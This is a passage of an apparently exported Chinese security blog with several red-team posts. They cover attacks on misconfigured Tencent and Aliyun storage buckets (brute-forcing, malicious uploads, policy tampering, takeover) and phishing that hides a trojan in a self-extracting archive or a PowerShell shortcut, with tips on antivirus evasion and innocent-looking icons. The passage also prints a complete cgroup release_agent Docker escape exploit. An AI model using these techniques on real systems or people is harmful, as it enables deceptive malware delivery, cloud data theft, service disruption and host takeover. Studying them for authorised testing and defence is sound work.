src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/e8e08436dc1a4e4d224ecc9525315f01.png"></p><pre class="line-numbers language-none"><code class="language-none">此刻也就具备了向Bucket的读写权限，PUT文件即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/6d5e19f781715deb557d29e3f2341cc9.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/7ea9bb79b24e62862f41631102e30653.png"></p><h2 id="Bucket接管"><a href="#Bucket接管" class="headerlink" title="Bucket接管"></a>Bucket接管</h2><pre class="line-numbers language-none"><code class="language-none">同阿里云不同的是在腾讯云上并不使用，腾讯云在创建Bucket时，会带一串个人id，但攻击者并不能进行目标的伪造<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/tencentcos/1e51164d90db77e93fe5fedb638758e6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> TencentCOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云OSS攻击利用</title>
      <link href="2022/05/08/a-li-yun-oss-gong-ji-li-yong/"/>
      <url>2022/05/08/a-li-yun-oss-gong-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">对象存储服务OSS-Object Storage Service是阿里云提供的一种海量、安全、低成本、高可靠的云存储服务，适合存放任意类型的文件，容量和处理能力弹性扩展，多种存储类型供选择，全面优化存储成本桶Bucket是对OSS中的一个存储空间的形象称呼，是存储对象的容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bucket访问"><a href="#Bucket访问" class="headerlink" title="Bucket访问"></a>Bucket访问</h2><pre class="line-numbers language-none"><code class="language-none">如下进入创建Bucket时，默认是私有权限，错误配置场景下，会导致遍历存储桶的情况出现<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/84811d1ddffb536715b34c8d86b7bded.png"></p><pre class="line-numbers language-none"><code class="language-none">例如公有读或公有读写如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/09bbce94b1b4678502d1ce5416a0a162.png"></p><pre class="line-numbers language-none"><code class="language-none">访问后效果如下，暂无法获得相应文件，还没配listobjecthttps:&#x2F;&#x2F;wobushihangzhou1.oss-cn-hangzhou.aliyuncs.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/733b58ac00fa95377e225d17dd572f11.png"></p><pre class="line-numbers language-none"><code class="language-none">能够直接访问下载到对应文件，以此可通过爆破key的方式下载文件https:&#x2F;&#x2F;wobushihangzhou1.oss-cn-hangzhou.aliyuncs.com&#x2F;yangsirtest.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/0ad9ee6366054c04d8b5ad3152abeecb.png"></p><pre class="line-numbers language-none"><code class="language-none">进步对Bucket授权策略进行修改，增加listobject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/3d56317cae3ad33a49fb8f1bcb17f7d5.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/5bc71d950a75663ee871889518ddc1ef.png"></p><pre class="line-numbers language-none"><code class="language-none">再度访问存储桶，就能够获得存储桶内对应key如下，进步下载即可https:&#x2F;&#x2F;wobushihangzhou1.oss-cn-hangzhou.aliyuncs.com&#x2F;yangsirtest.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/dfff461571a8400700f8d5b99ef79fad.png"></p><h2 id="Bucket爆破"><a href="#Bucket爆破" class="headerlink" title="Bucket爆破"></a>Bucket爆破</h2><pre class="line-numbers language-none"><code class="language-none">除了对key进行爆破外，还能够对Bucket名字进行爆破通过字典对不知道Bucket的存储桶进行爆破，尝试获取有效名字，通常情况下回返回几种状态，如下NoSuchBucket：没有这个存储桶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/92c5b32ada36eee6dd9715260701b0dd.png"></p><pre class="line-numbers language-none"><code class="language-none">InvalidBucketName：不合规的存储桶名字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/d0ff3fff1584e8a0e9572eb6a109e061.png"></p><pre class="line-numbers language-none"><code class="language-none">Bucket桶常见返回如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/47792d35db5f38de2c8de74e7f7be28a.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/16d3f0dfe99c13644a1c349e385bb3ac.png"></p><h3 id="Bucket遍历"><a href="#Bucket遍历" class="headerlink" title="Bucket遍历"></a>Bucket遍历</h3><pre class="line-numbers language-none"><code class="language-none">如进行对Bucket爆破后，访问对应Bucket即可遍历Object，进步可对文件进行下载<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/8595db302560559a981093a5ead0d541.png"></p><h2 id="Bucket特殊策略配置"><a href="#Bucket特殊策略配置" class="headerlink" title="Bucket特殊策略配置"></a>Bucket特殊策略配置</h2><pre class="line-numbers language-none"><code class="language-none">设定指定的ip才能访问到目标Bucket，其他ip服务访问获取到服务信息效果如下，当然配成特定ua头访问也是同理可利用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/ad7830b222a02fbf57c1398111b76c29.png"></p><pre class="line-numbers language-none"><code class="language-none">策略获取&#123;    &quot;Version&quot;: &quot;1&quot;,    &quot;Statement&quot;: [        &#123;            &quot;Principal&quot;: [                &quot;*&quot;            ],            &quot;Effect&quot;: &quot;Allow&quot;,            &quot;Resource&quot;: [                &quot;acs:oss:*:1566611960178551:wobushihangzhou1&#x2F;*&quot;            ],            &quot;Condition&quot;: &#123;                &quot;Bool&quot;: &#123;                    &quot;acs:SecureTransport&quot;: [                        &quot;true&quot;                    ]                &#125;,                &quot;IpAddress&quot;: &#123;                    &quot;acs:SourceIp&quot;: [                        &quot;101.XXXXX&quot;                    ]                &#125;            &#125;,            &quot;Action&quot;: [                &quot;oss:GetObject&quot;,                &quot;oss:GetObjectAcl&quot;,                &quot;oss:ListObjects&quot;,                &quot;oss:RestoreObject&quot;,                &quot;oss:GetVodPlaylist&quot;,                &quot;oss:ListObjectVersions&quot;,                &quot;oss:GetObjectVersion&quot;,                &quot;oss:GetObjectVersionAcl&quot;,                &quot;oss:RestoreObjectVersion&quot;            ]        &#125;,        &#123;            &quot;Principal&quot;: [                &quot;*&quot;            ],            &quot;Effect&quot;: &quot;Allow&quot;,            &quot;Resource&quot;: [                &quot;acs:oss:*:1566611960178551:wobushihangzhou1&quot;            ],            &quot;Condition&quot;: &#123;                &quot;StringLike&quot;: &#123;                    &quot;oss:Prefix&quot;: [                        &quot;*&quot;                    ]                &#125;,                &quot;Bool&quot;: &#123;                    &quot;acs:SecureTransport&quot;: [                        &quot;true&quot;                    ]                &#125;,                &quot;IpAddress&quot;: &#123;                    &quot;acs:SourceIp&quot;: [                        &quot;101.XXXXX&quot;                    ]                &#125;            &#125;,            &quot;Action&quot;: [                &quot;oss:ListObjects&quot;,                &quot;oss:GetObject&quot;            ]        &#125;    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/0bd74ece735fc8857940c18de0d0a784.png"></p><pre class="line-numbers language-none"><code class="language-none">进步以该地址进行访问，成功获取目标Bucket及资源，同样如果对目标对部分使用的恶意ip进行了封禁，此处读取到notipadd也可进步针对性绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/fdde84cca497d9f7b85ca88e7d6b2b05.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/bc7e5368910f6defd81b368286be7e67.png"></p><h2 id="Bucket文件上传"><a href="#Bucket文件上传" class="headerlink" title="Bucket文件上传"></a>Bucket文件上传</h2><pre class="line-numbers language-none"><code class="language-none">Bucket桶的权限为可写入，以此攻击者能够进步写入恶意文件，诱导下载，或进步覆盖已有的正常文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/2dfa556a2456b5df00e27eae48919992.png"></p><pre class="line-numbers language-none"><code class="language-none">利用put上传文件如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/6afbf48dca788aae623a6fe4753d566a.png"></p><pre class="line-numbers language-none"><code class="language-none">确认成功写入bucket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/8c8d73d0c0050144d451ed92d7bc7edd.png"></p><h2 id="Bucketpolicy修改"><a href="#Bucketpolicy修改" class="headerlink" title="Bucketpolicy修改"></a>Bucketpolicy修改</h2><pre class="line-numbers language-none"><code class="language-none">通过访问Bucket，发现对应的资源被policy拦截，当前policy的allow如下&#123;    &quot;Version&quot;: &quot;1&quot;,    &quot;Statement&quot;: [        &#123;            &quot;Effect&quot;: &quot;Allow&quot;,            &quot;Action&quot;: [                &quot;oss:PutBucketPolicy&quot;,                &quot;oss:GetBucketPolicy&quot;            ],            &quot;Principal&quot;: [                &quot;*&quot;            ],            &quot;Resource&quot;: [                &quot;acs:oss:*:1566611960178551:wobushihangzhou2&quot;            ]        &#125;,        &#123;            &quot;Principal&quot;: [                &quot;*&quot;            ],            &quot;Effect&quot;: &quot;Deny&quot;,            &quot;Resource&quot;: [                &quot;acs:oss:*:1566611960178551:wobushihangzhou2&quot;            ],            &quot;Action&quot;: [                &quot;oss:ListObjects&quot;,                &quot;oss:GetObject&quot;            ]        &#125;    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/d8c50f8c1b43750443728a26ee554968.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/2af4fc021c0f3b439a8b542833b75df3.png"></p><pre class="line-numbers language-none"><code class="language-none">通过进步对policy修改，如果没有GetObject、ListObjects那就新增下，此处直接给与allow权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/2879b0d2ae4dc590a6df112a59d5ca87.png"></p><pre class="line-numbers language-none"><code class="language-none">配置完后确认能够正常访问资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/3e1f86da5433ee672466360ec5edba3f.png"></p><h3 id="影响可用性"><a href="#影响可用性" class="headerlink" title="影响可用性"></a>影响可用性</h3><pre class="line-numbers language-none"><code class="language-none">通过deny掉oss下的业务资源导致可能存在的远程调用无法使用，从而进步影响可用性，上面方法同理配置即可，访问原先应用资源，确认已无法正常访问，因policy的deny<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/fa233328e56846e99265e32b1d941b6b.png"></p><h2 id="Bucket接管"><a href="#Bucket接管" class="headerlink" title="Bucket接管"></a>Bucket接管</h2><pre class="line-numbers language-none"><code class="language-none">提前配好域名CNAME解析oss域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/c8ca9fbf1c68c0f2ab59726658fd9ea2.png"></p><pre class="line-numbers language-none"><code class="language-none">正常效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/d0c35d555fb89374a93e15491b84c727.png"></p><pre class="line-numbers language-none"><code class="language-none">注意利用需要Bucket显示NoSuchBucket，AccessDenied则不行，原因可看先前介绍<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/748528164d6353271268229e2197ac9a.png"></p><pre class="line-numbers language-none"><code class="language-none">先不解绑域名，删除存储桶出现如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/3291baaa8fe41613b9705734f8c0f0a9.png"></p><pre class="line-numbers language-none"><code class="language-none">再度访问域名，出现AccessDenied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/e6fe2fd976308f4d51b938339438e452.png"></p><pre class="line-numbers language-none"><code class="language-none">结合cname获取oss域名后，再度访问先前的oss域名，变为了NoSuchBucket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/0ee84848f16df161a21da7809cabfc79.png"></p><pre class="line-numbers language-none"><code class="language-none">此刻重新创建同名的新Bucket即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/557d7b786c879214b2d231e95ab98b9a.png"></p><pre class="line-numbers language-none"><code class="language-none">同理写入文件后访问域名如下~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/alioss/35b0628279c2fabacc25cc408658c686.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> AliyunOSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼基本方法之自解压</title>
      <link href="2022/05/06/diao-yu-ji-ben-fang-fa-zhi-zi-jie-ya/"/>
      <url>2022/05/06/diao-yu-ji-ben-fang-fa-zhi-zi-jie-ya/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">利用压缩包自解压实现双击运行后木马上线，记得自行对木马免杀进行处理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">两个exe，一个木马，一个正常文件，正常文件的运行释放用以迷惑目标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/1.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如下选择自解压<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/2.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">高级设置，路径设置如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/3.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进步设置对应程序C:\Windows\Temp\a<span class="token operator">-</span>yangsir<span class="token punctuation">.</span>exeC:\Windows\Temp\calc<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/4.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">模式设置如下，隐藏全部<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/5.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">更新设置如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/6.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">最后在文件图标选个没那么可疑的图标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/7.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">压缩完效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/8.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">双击运行后效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/9.png" alt=" "><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/10.png" alt=" "></p><h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">设置的更加简略些，同理自解压<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/11.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">设置这里配置下提取前后的运行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/12.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">模式依旧记得隐藏<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/13.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">更新如下设置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/14.png" alt=" "></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">同理可在文本和图标处选择个图标就行设置的，最终运行后上线如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingzijieya/15.png" alt=" "></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Fishing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼基本方法之快捷方式</title>
      <link href="2022/05/06/diao-yu-ji-ben-fang-fa-zhi-kuai-jie-fang-shi/"/>
      <url>2022/05/06/diao-yu-ji-ben-fang-fa-zhi-kuai-jie-fang-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">利用快捷方式钓鱼，增强隐蔽性，此处需要自行对powershell免杀进行处理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">随便找个图标，打开属性<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingkuaijiefangshi/1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">目标处贴powershell命令即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingkuaijiefangshi/2.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进步可以修改快捷方式图标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingkuaijiefangshi/3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行后上线如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/fishingkuaijiefangshi/4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Fishing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器利用思路(二)</title>
      <link href="2022/04/15/docker-rong-qi-li-yong-si-lu-er/"/>
      <url>2022/04/15/docker-rong-qi-li-yong-si-lu-er/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">对上一篇docker容器利用思路的补充，包含其他常见特权逃逸&amp;配置逃逸<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="不安全的配置"><a href="#不安全的配置" class="headerlink" title="不安全的配置"></a>不安全的配置</h2><h3 id="高危启动参数"><a href="#高危启动参数" class="headerlink" title="高危启动参数"></a>高危启动参数</h3><h4 id="挂载敏感目录利用"><a href="#挂载敏感目录利用" class="headerlink" title="挂载敏感目录利用"></a>挂载敏感目录利用</h4><h5 id="proc目录"><a href="#proc目录" class="headerlink" title="/proc目录"></a>/proc目录</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">proc目录是个伪文件系统，动态反应系统进程、及其他组件的状态信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">其中<span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>kernel<span class="token operator">/</span>core_pattern是负责进程出现奔溃时进程内存转储的，当第一个字符是<span class="token punctuation">|</span>时，后面的会以命令行的方式进行解析运行cdk直接进行命令执行<span class="token punctuation">.</span><span class="token operator">/</span>cdk run <span class="token function">mount</span><span class="token operator">-</span>procfs  <span class="token operator">/</span>mnt<span class="token operator">/</span>proctest  <span class="token string">"touch /tmp/proctest"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/2.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">宿主机文件新建如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">同样可以进步写计划任务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="cap-sys-admin利用"><a href="#cap-sys-admin利用" class="headerlink" title="cap_sys_admin利用"></a><strong>cap_sys_admin</strong>利用</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">利用前提：以root用户身份在容器内运行使用SYS_ADMINLinux功能运行缺少AppArmor配置文件，否则将允许mountsyscallcgroup v1虚拟文件系统必须以读写方式安装在容器内常见利用notify_on_release、重写devices<span class="token punctuation">.</span>allow等方式逃逸需要具备特权如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/4.png"></p><h5 id="notify-on-release-逃逸"><a href="#notify-on-release-逃逸" class="headerlink" title="notify_on_release 逃逸"></a>notify_on_release 逃逸</h5><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">公开的exp:mkdir <span class="token operator">/</span>tmp<span class="token operator">/</span>cgrp &amp;&amp; <span class="token function">mount</span> <span class="token operator">-</span>t cgroup <span class="token operator">-</span>o memory cgroup <span class="token operator">/</span>tmp<span class="token operator">/</span>cgrp &amp;&amp; mkdir <span class="token operator">/</span>tmp<span class="token operator">/</span>cgrp<span class="token operator">/</span>x<span class="token function">echo</span> 1 > <span class="token operator">/</span>tmp<span class="token operator">/</span>cgrp<span class="token operator">/</span>x<span class="token operator">/</span>notify_on_releasehost_path=`sed <span class="token operator">-</span>n <span class="token string">'s/.*\perdir=\([^,]*\).*/\1/p'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>mtab`<span class="token function">echo</span> <span class="token string">"<span class="token variable">$host_path</span>/cmd"</span> > <span class="token operator">/</span>tmp<span class="token operator">/</span>cgrp<span class="token operator">/</span>release_agent<span class="token function">echo</span> <span class="token string">'#!/bin/sh'</span> > <span class="token operator">/</span>cmd<span class="token function">echo</span> <span class="token string">"ps aux > <span class="token variable">$host_path</span>/output"</span> >> <span class="token operator">/</span>cmdchmod a<span class="token operator">+</span>x <span class="token operator">/</span>cmdsh <span class="token operator">-</span>c <span class="token string">"echo \$\$ > /tmp/cgrp/x/cgroup.procs"</span> 获得权限如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/5.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">补充notify_on_release与cgroup：cgroups是内核机制，根据需求把一系列系统任务及其子任务整合到按资源划分等级不同的组内，从而为系统资源管理提供一个统一框架，在linux下表现形式为文件系统，查看系统cgroup挂载情况如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/6.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进步可看到相关子系统，如cpu、devices、memory等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/7.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">以memory子系统为例查看每个子系统包含的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/8.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">涉及到逃逸的知识点：cgroup<span class="token punctuation">.</span>procs：加入此cgroup中的进程、进程组列表tasks：加入到此cgroup子系统的进程，以pid列表形式存储notify_on_release：用于标记当次cgroup子系统进程都退出后是否允许release_agent，0不运行，1运行，如果当前子系统新建了子系统则默认继承release_agent：只存在顶层子系统中，上面的设置为1时候，此cgroup子系统的所有进程都退出后以内核权限运行的程序利用原理：需要一个可写的cgroup，进步创建一个子cgroup然后将子cgroup的notify_on_release设置为1实际配置情况如下<span aria-hidden="true" 